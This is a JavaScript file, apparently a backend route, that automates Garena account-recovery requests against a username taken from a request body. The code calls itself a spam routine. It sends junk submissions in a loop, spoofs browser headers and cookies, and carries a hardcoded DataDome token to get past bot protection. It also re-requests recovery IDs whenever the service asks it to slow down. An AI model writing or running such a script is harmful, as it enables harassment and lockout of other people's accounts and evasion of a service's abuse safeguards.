import axios from "axios";
import { stringify } from "flatted"; 
// Hàm lấy request_id từ API Garena
const datadom = 'llHALJCJ_DBp969otoi45o2IogkWhE6Y8suRYfC5FsMnMAmPBB~5ohxzQuWk~XriQuf~4aqkFWHWH0WWPbuZLUvGeQB~gT~ygnB5onBMUyWeHKhidO2LZ9ny1feimPRB'
const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
export async function initRecovery(username) {
    try {
        const payload = {
            account: username,
            app_id: 100001,
            source: "account center",
        };

        console.log("📤 Payload gửi đi:", JSON.stringify(payload, null, 2)); // ✅ Kiểm tra dữ liệu gửi đi

        const response = await axios.post(
            "https://account.garena.com/api/account/recovery/init",
            payload,
            {
                headers: {
                    Accept: "application/json, text/plain, */*",
                    "Accept-Language": "vi,en-US;q=0.9,en;q=0.8",
                    Connection: "keep-alive",
                    Cookie:
                      `_ga=GA1.1.26128831.1691742988; _ga_Y1QNJ6ZLV6=GS1.1.1692620638.1.0.1692620645.0.0.0; _ga_1M7M9L6VPX=GS1.1.1693919088.3.1.1693919245.0.0.0; datadome=${datadom}`,
                      Referer:
                      "https://sso.garena.com/universal/lo...count.garena.com/?locale_name=VN&locale=vi-VN",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "User-Agent":
                      `${userAgent}`,
                    "sec-ch-ua":
                      '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"macOS"',
                    "x-datadome-clientid":
                      `${datadom}`
                  },
            }
        );
        console.log("✅ đây là request_id:", response.data.request_id);
        return response.data;
    } catch (error) {
        console.error("🚨 Lỗi khi gửi request init:", error.response ? error.response.data : error.message);
        return null;
    }
}


// Hàm gửi request submitRecovery
async function submitRecovery(data) {
    try {
        const payload = {
            action: 1,
            data: 'hihihi',
            source: "account center",
            request_id: data.request_id
        };
        console.log("day la payload",payload);
        
        const response = await axios.post(
            "https://account.garena.com/api/account/recovery/submit",
            payload,
            {
                headers: {
                    Accept: "application/json, text/plain, */*",
                    "Accept-Language": "vi,en-US;q=0.9,en;q=0.8",
                    Connection: "keep-alive",
                    Cookie:
                      `_ga=GA1.1.26128831.1691742988; _ga_Y1QNJ6ZLV6=GS1.1.1692620638.1.0.1692620645.0.0.0; _ga_1M7M9L6VPX=GS1.1.1693919088.3.1.1693919245.0.0.0; datadome=${datadom}`,
                      Referer:
                      "https://sso.garena.com/universal/lo...count.garena.com/?locale_name=VN&locale=vi-VN",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "User-Agent":
                      `${userAgent}`,
                    "sec-ch-ua":
                      '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"macOS"',
                    "x-datadome-clientid":
                      `${datadom}`
                  },
            }
        );

        console.log("✅ Gửi thành công:", response.data);
        return true; // Gửi thành công
    } catch (error) {
        console.error("🚨 Lỗi khi gửi request submit:", error.response ? error.response.data : error.message);
        return false; // Gửi thất bại
    }
}

// Hàm spam 
export async function spamAccGarena(req, res) {
    const { username } = req.body;

    while (true) { // Luôn chạy cho đến khi hoàn thành đủ 7 lần
        let requestData = await initRecovery(username);
        if (!requestData || !requestData.request_id) {
            console.log("🚨 Không thể lấy request_id, dừng spam.");
            return;
        }

        let request_id = requestData.request_id;
        let attempt = 0; // Reset lại số lần gửi request

        while (attempt < 5) {
            console.log(`🔄 Gửi request lần ${attempt + 1} với request_id: ${request_id}...`);

            // Chờ 3 giây trước khi gửi request tiếp theo
            await new Promise(resolve => setTimeout(resolve, 3000));

            const response = await submitRecovery({ request_id });
            console.log("✅ Phản hồi:", response);

            if (!response) {
                console.log("❌ Lỗi không xác định, dừng spam.");
                return;
            }

            if (response.error === 'error_retry') {
                console.log("🔄 Gặp lỗi 'error_retry', lấy lại request_id mới...");
                let newRequestData = await initRecovery(username);
                if (!newRequestData || !newRequestData.request_id) {
                    console.log("🚨 Không thể lấy request_id mới, dừng spam.");
                    return;
                }
                request_id = newRequestData.request_id; // Cập nhật request_id mới
                continue; // Thử lại mà không tăng số lần gửi request
            }

            if (response.error === 'error_request_id') {
                console.log("⚠ Request ID không hợp lệ, lấy lại request_id mới và chạy lại từ đầu...");
                break; // Reset toàn bộ vòng lặp và lấy request_id mới
            }

            attempt++; // Chỉ tăng nếu không gặp lỗi `error_retry`
        }

        console.log("✅ Hoàn thành 7 lần gửi request!");
        return; // Thoát hoàn toàn nếu chạy đủ 7 lần thành công
    }
}


